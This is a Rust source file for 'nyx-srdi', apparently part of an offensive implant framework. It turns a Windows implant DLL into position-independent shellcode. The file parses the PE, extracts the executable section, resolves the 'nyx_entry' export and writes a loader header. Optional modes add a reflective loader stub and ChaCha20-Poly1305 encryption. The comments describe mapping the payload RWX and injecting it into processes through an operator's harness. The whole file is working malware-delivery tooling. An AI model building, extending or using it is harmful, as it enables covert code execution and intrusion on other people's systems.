//! nyx-srdi — host-side PIC extractor.
//!
//! Turns the `nyx-implant-win` cdylib (a PE DLL) into position-independent
//! shellcode (`agent.bin`). The implant crate is already built
//! position-independent in spirit (`#![no_std]` + `#![no_main]`, custom NT-heap
//! allocator, PEB-walk resolution, no IAT) — but it ships as a PE so the
//! toolchain can build it. This tool extracts the executable payload and emits
//! a flat blob a loader can map + jump into.
//!
//! ## What it does (v1)
//! 1. Parses the PE: reads the section table, finds `.text` (the first section
//!    with IMAGE_SCN_MEM_EXECUTE), and locates the exported `nyx_entry` RVA.
//! 2. Emits a 16-byte header in front of the `.text` bytes:
//!      [0..4]  magic "NYX1"
//!      [4..8]  u32 LE: offset into the blob of `nyx_entry` (relative to the
//!              START of the .text bytes, not the header)
//!      [8..12] u32 LE: length of the .text blob
//!      [12..16] reserved (0)
//!    followed by the raw `.text` bytes.
//! 3. A host loader (separate) maps the bytes RWX at a chosen address, then
//!    jumps to `base + header.entry_offset`.
//!
//! ## What it does NOT do (v1 — documented)
//! - Apply PE base relocations to the .text bytes. The implant is written to be
//!   position-independent (it resolves everything via the PEB walk, not the
//!   IAT), so the .text has no data references that need fixing up at load
//!   time — IF that assumption holds. A future version will walk the reloc
//!   table and apply deltas to be safe; for now it emits the bytes as-is and
//!   the operator verifies with a self-test run.
//! - Emit a self-contained reflective loader stub (the Stardust sRDI "loader
//!   that resolves its own imports + maps sections"). That's a separate,
//!   substantial piece. This tool assumes the host loader (e.g. an
//!   inject-into-process harness) handles the mapping.
//!
//! ## Usage
//! ```text
//! cargo run --release -- path/to/nyx_implant_win.dll -o agent.bin
//! cargo run --release -- path/to/nyx_implant_win.dll            # → agent.bin in CWD
//! ```

use std::env;
use std::fs;
use std::path::PathBuf;
use std::process;

const MAGIC_V1: &[u8; 4] = b"NYX1";

fn main() {
    let args: Vec<String> = env::args().collect();
    if args.len() < 2 {
        usage(&args[0]);
    }
    let dll = &args[1];
    let mut out = PathBuf::from("agent.bin");
    let mut format_v2 = false;
    let mut loader = false;
    let mut encrypt = false;
    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "-o" | "--output" => {
                i += 1;
                if i >= args.len() {
                    eprintln!("error: -o needs a path");
                    process::exit(2);
                }
                out = PathBuf::from(&args[i]);
            }
            "--format" => {
                i += 1;
                if i >= args.len() {
                    eprintln!("error: --format needs a value (v1 or v2)");
                    process::exit(2);
                }
                match args[i].as_str() {
                    "v1" => format_v2 = false,
                    "v2" => format_v2 = true,
                    other => {
                        eprintln!("error: unknown format '{}' (expected v1 or v2)", other);
                        process::exit(2);
                    }
                }
            }
            "--loader" => {
                loader = true;
            }
            "--encrypt" => {
                encrypt = true;
            }
            "-h" | "--help" => {
                usage(&args[0]);
            }
            other => {
                eprintln!("error: unknown arg '{}'", other);
                process::exit(2);
            }
        }
        i += 1;
    }

    // Validate flag combinations.
    if loader && !format_v2 {
        eprintln!("error: --loader requires --format v2");
        process::exit(2);
    }
    if encrypt && !format_v2 {
        eprintln!("error: --encrypt requires --format v2");
        process::exit(2);
    }

    let pe = match fs::read(dll) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: read {}: {}", dll, e);
            process::exit(1);
        }
    };

    if !format_v2 {
        // ── v1: backward-compatible .text extraction ──────────────────────
        match extract(&pe) {
            Ok((entry_rva, text)) => {
                let mut blob = Vec::with_capacity(16 + text.len());
                blob.extend_from_slice(MAGIC_V1);
                blob.extend_from_slice(&(entry_rva as u32).to_le_bytes());
                blob.extend_from_slice(&(text.len() as u32).to_le_bytes());
                blob.extend_from_slice(&0u32.to_le_bytes()); // reserved
                blob.extend_from_slice(&text);
                match fs::write(&out, &blob) {
                    Ok(_) => {
                        eprintln!(
                            "wrote {} ({} bytes: 16-byte NYX1 header + {} .text; entry @ +0x{:x})",
                            out.display(),
                            blob.len(),
                            text.len(),
                            entry_rva
                        );
                    }
                    Err(e) => {
                        eprintln!("error: write {}: {}", out.display(), e);
                        process::exit(1);
                    }
                }
            }
            Err(e) => {
                eprintln!("error: {}", e);
                process::exit(1);
            }
        }
    } else if loader && encrypt {
        // ── v2 + loader + encrypt: full reflective loader via nyx_loader ──
        let config = nyx_loader::LoaderConfig::random();
        let payload = nyx_loader::wrap_payload(&pe, &config);
        match fs::write(&out, &payload) {
            Ok(_) => {
                eprintln!(
                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B encrypted DLL + 16B tag; format=v2 loader=yes encrypt=yes)",
                    out.display(),
                    payload.len(),
                    nyx_loader::PIC_STUB_LEN,
                    pe.len(),
                );
            }
            Err(e) => {
                eprintln!("error: write {}: {}", out.display(), e);
                process::exit(1);
            }
        }
    } else if loader {
        // ── v2 + loader (no encrypt): stub + NYX2 header + raw DLL ──────
        use nyx_loader::stub::{PIC_STUB, NYX2_MAGIC};
        let dll_len = pe.len() as u32;
        let mut payload = Vec::with_capacity(PIC_STUB.len() + 4 + 4 + 12 + pe.len());
        payload.extend_from_slice(PIC_STUB);
        payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());
        payload.extend_from_slice(&dll_len.to_le_bytes());
        payload.extend_from_slice(&[0u8; 12]); // zero nonce (no encryption)
        payload.extend_from_slice(&pe);
        match fs::write(&out, &payload) {
            Ok(_) => {
                eprintln!(
                    "wrote {} ({} bytes: {}B PIC stub + NYX2 header + {}B raw DLL; format=v2 loader=yes encrypt=no)",
                    out.display(),
                    payload.len(),
                    PIC_STUB.len(),
                    pe.len(),
                );
            }
            Err(e) => {
                eprintln!("error: write {}: {}", out.display(), e);
                process::exit(1);
            }
        }
    } else {
        // ── v2 bare (no loader, no encrypt): NYX2 header + raw DLL ──────
        use nyx_loader::stub::NYX2_MAGIC;
        let dll_len = pe.len() as u32;
        let mut payload = Vec::with_capacity(4 + 4 + 12 + pe.len());
        payload.extend_from_slice(&NYX2_MAGIC.to_le_bytes());
        payload.extend_from_slice(&dll_len.to_le_bytes());
        payload.extend_from_slice(&[0u8; 12]); // zero nonce (no encryption)
        payload.extend_from_slice(&pe);
        match fs::write(&out, &payload) {
            Ok(_) => {
                eprintln!(
                    "wrote {} ({} bytes: NYX2 header + {}B raw DLL; format=v2 loader=no encrypt=no)",
                    out.display(),
                    payload.len(),
                    pe.len(),
                );
            }
            Err(e) => {
                eprintln!("error: write {}: {}", out.display(), e);
                process::exit(1);
            }
        }
    }
}

fn usage(prog: &str) -> ! {
    eprintln!("usage: {} <nyx_implant_win.dll> [options]", prog);
    eprintln!();
    eprintln!("options:");
    eprintln!("  -o, --output <path>   Output file path (default: agent.bin)");
    eprintln!("  --format v1|v2        Payload format (default: v1)");
    eprintln!("  --loader              Embed PIC reflective loader stub (requires --format v2)");
    eprintln!("  --encrypt             ChaCha20-Poly1305 encrypt the DLL portion (requires --format v2)");
    eprintln!("  -h, --help            Show this help");
    eprintln!();
    eprintln!("examples:");
    eprintln!("  {} implant.dll                          # v1: .text extraction -> agent.bin", prog);
    eprintln!("  {} implant.dll -o payload.bin           # v1 with custom output", prog);
    eprintln!("  {} implant.dll --format v2 --loader --encrypt  # v2: full reflective loader", prog);
    process::exit(2);
}

/// PE parse + extract. Returns (entry_rva_relative_to_text_start, text_bytes).
/// `entry_rva` is the RVA of `nyx_entry` MINUS the .text section's RVA, so the
/// loader computes the entry as `text_base + entry_rva`.
fn extract(pe: &[u8]) -> Result<(usize, Vec<u8>), String> {
    if pe.len() < 0x40 || &pe[0..2] != b"MZ" {
        return Err("not an MZ/PE file".into());
    }
    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;
    if pe.len() < e_lfanew + 24 || &pe[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return Err("bad PE signature".into());
    }
    let coff_off = e_lfanew + 4;
    let num_sections = u16::from_le_bytes([pe[coff_off + 2], pe[coff_off + 3]]) as usize;
    let opt_header_size = u16::from_le_bytes([pe[coff_off + 16], pe[coff_off + 17]]) as usize;
    let opt_off = coff_off + 20;
    let magic = u16::from_le_bytes([pe[opt_off], pe[opt_off + 1]]);
    // Data directory index 0 = Export Table. For PE32+ the data dirs start at
    // opt_off + 112; for PE32 at opt_off + 96.
    let dd_off = if magic == 0x20B {
        opt_off + 112
    } else if magic == 0x10B {
        opt_off + 96
    } else {
        return Err("unknown PE optional header magic".into());
    };
    let section_table_off = opt_off + opt_header_size;

    // Export directory: data dir[0] = (rva, size).
    let export_rva = u32::from_le_bytes([
        pe[dd_off],
        pe[dd_off + 1],
        pe[dd_off + 2],
        pe[dd_off + 3],
    ]) as usize;
    if export_rva == 0 {
        return Err("PE has no export directory — is this a cdylib?".into());
    }

    // Find .text: first section with IMAGE_SCN_MEM_EXECUTE (0x20000000).
    // Track the executable section (its RVA + raw bytes) for entry lookup.
    let mut text_rva: usize = 0;
    let mut text_raw_ptr: usize = 0;
    let mut text_raw_size: usize = 0;
    for s in 0..num_sections {
        let base = section_table_off + s * 40;
        if base + 40 > pe.len() {
            break;
        }
        let v_size = u32::from_le_bytes([pe[base + 8], pe[base + 9], pe[base + 10], pe[base + 11]]);
        let v_addr = u32::from_le_bytes([pe[base + 12], pe[base + 13], pe[base + 14], pe[base + 15]]);
        let raw_size =
            u32::from_le_bytes([pe[base + 16], pe[base + 17], pe[base + 18], pe[base + 19]]);
        let raw_ptr =
            u32::from_le_bytes([pe[base + 20], pe[base + 21], pe[base + 22], pe[base + 23]]);
        let chars = u32::from_le_bytes([pe[base + 36], pe[base + 37], pe[base + 38], pe[base + 39]]);
        if chars & 0x2000_0000 != 0 && v_addr != 0 {
            text_rva = v_addr as usize;
            text_raw_ptr = raw_ptr as usize;
            text_raw_size = (raw_size as usize).min(v_size as usize);
            break;
        }
    }
    if text_rva == 0 {
        return Err("no executable section found".into());
    }
    if text_raw_ptr + text_raw_size > pe.len() {
        return Err("text section points past end of file".into());
    }
    let text_bytes = pe[text_raw_ptr..text_raw_ptr + text_raw_size].to_vec();

    // Resolve nyx_entry's RVA from the export directory, then convert to an
    // offset relative to .text's start.
    let entry_rva = resolve_export_rva(pe, export_rva, section_table_off, num_sections, "nyx_entry")?;
    if entry_rva < text_rva || entry_rva >= text_rva + text_raw_size {
        return Err(format!(
            "nyx_entry RVA 0x{:x} outside .text [0x{:x}, 0x{:x})",
            entry_rva, text_rva, text_rva + text_raw_size
        ));
    }
    let entry_rel = entry_rva - text_rva;
    Ok((entry_rel, text_bytes))
}

/// Resolve a named export's RVA by walking the export directory's
/// AddressOfNames → AddressOfNamesOrdinals → AddressOfFunctions tables. Each
/// table is itself an RVA into a section, so rva→file-offset translation is
/// needed (a section's raw bytes aren't at its RVA).
fn resolve_export_rva(
    pe: &[u8],
    export_rva: usize,
    section_table_off: usize,
    num_sections: usize,
    name: &str,
) -> Result<usize, String> {
    let exp_file = rva_to_off(pe, section_table_off, num_sections, export_rva)
        .ok_or_else(|| "export dir RVA not in any section".to_string())?;
    // IMAGE_EXPORT_DIRECTORY: NumberOfNames @ +0x18, AddressOfNames @ +0x20,
    // AddressOfNameOrdinals @ +0x24, AddressOfFunctions @ +0x1C.
    let num_names = u32::from_le_bytes([
        pe[exp_file + 0x18],
        pe[exp_file + 0x19],
        pe[exp_file + 0x1A],
        pe[exp_file + 0x1B],
    ]) as usize;
    let addr_funcs = u32::from_le_bytes([
        pe[exp_file + 0x1C],
        pe[exp_file + 0x1D],
        pe[exp_file + 0x1E],
        pe[exp_file + 0x1F],
    ]) as usize;
    let addr_names = u32::from_le_bytes([
        pe[exp_file + 0x20],
        pe[exp_file + 0x21],
        pe[exp_file + 0x22],
        pe[exp_file + 0x23],
    ]) as usize;
    let addr_ordinals = u32::from_le_bytes([
        pe[exp_file + 0x24],
        pe[exp_file + 0x25],
        pe[exp_file + 0x26],
        pe[exp_file + 0x27],
    ]) as usize;

    let names_file = rva_to_off(pe, section_table_off, num_sections, addr_names)
        .ok_or_else(|| "AddressOfNames RVA unresolved".to_string())?;
    let ordinals_file = rva_to_off(pe, section_table_off, num_sections, addr_ordinals)
        .ok_or_else(|| "AddressOfNameOrdinals RVA unresolved".to_string())?;
    let funcs_file = rva_to_off(pe, section_table_off, num_sections, addr_funcs)
        .ok_or_else(|| "AddressOfFunctions RVA unresolved".to_string())?;

    for i in 0..num_names {
        let name_rva = u32::from_le_bytes([
            pe[names_file + i * 4],
            pe[names_file + i * 4 + 1],
            pe[names_file + i * 4 + 2],
            pe[names_file + i * 4 + 3],
        ]) as usize;
        let name_off = match rva_to_off(pe, section_table_off, num_sections, name_rva) {
            Some(o) => o,
            None => continue,
        };
        // Compare NUL-terminated ASCII name at name_off.
        let mut end = name_off;
        while end < pe.len() && pe[end] != 0 {
            end += 1;
        }
        if &pe[name_off..end] == name.as_bytes() {
            let ordinal = u16::from_le_bytes([
                pe[ordinals_file + i * 2],
                pe[ordinals_file + i * 2 + 1],
            ]) as usize;
            let func_rva = u32::from_le_bytes([
                pe[funcs_file + ordinal * 4],
                pe[funcs_file + ordinal * 4 + 1],
                pe[funcs_file + ordinal * 4 + 2],
                pe[funcs_file + ordinal * 4 + 3],
            ]) as usize;
            return Ok(func_rva);
        }
    }
    Err(format!("export '{}' not found", name))
}

/// Translate an RVA to a file offset via the section table.
fn rva_to_off(pe: &[u8], section_table_off: usize, num_sections: usize, rva: usize) -> Option<usize> {
    for s in 0..num_sections {
        let base = section_table_off + s * 40;
        if base + 40 > pe.len() {
            break;
        }
        let v_size = u32::from_le_bytes([pe[base + 8], pe[base + 9], pe[base + 10], pe[base + 11]]) as usize;
        let v_addr = u32::from_le_bytes([pe[base + 12], pe[base + 13], pe[base + 14], pe[base + 15]]) as usize;
        let raw_ptr = u32::from_le_bytes([pe[base + 20], pe[base + 21], pe[base + 22], pe[base + 23]]) as usize;
        if rva >= v_addr && rva < v_addr + v_size {
            return Some(raw_ptr + (rva - v_addr));
        }
    }
    None
}
